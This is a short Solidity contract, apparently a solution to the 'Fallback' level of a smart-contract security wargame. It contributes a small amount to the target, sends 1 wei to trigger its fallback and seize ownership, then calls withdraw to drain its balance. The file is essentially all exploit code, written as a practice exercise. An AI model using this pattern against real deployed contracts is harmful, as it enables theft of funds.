// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Fallback.sol";

contract FallbackAttract{
    Fallback public fall;
    constructor(Fallback addr) {
        fall = addr;
    }
    function get() public payable {
        fall.contribute{value : 0.00001 ether}();
    }
    function att() public payable {
        payable(address(fall)).transfer(1 wei);
        fall.withdraw();
    }
    
}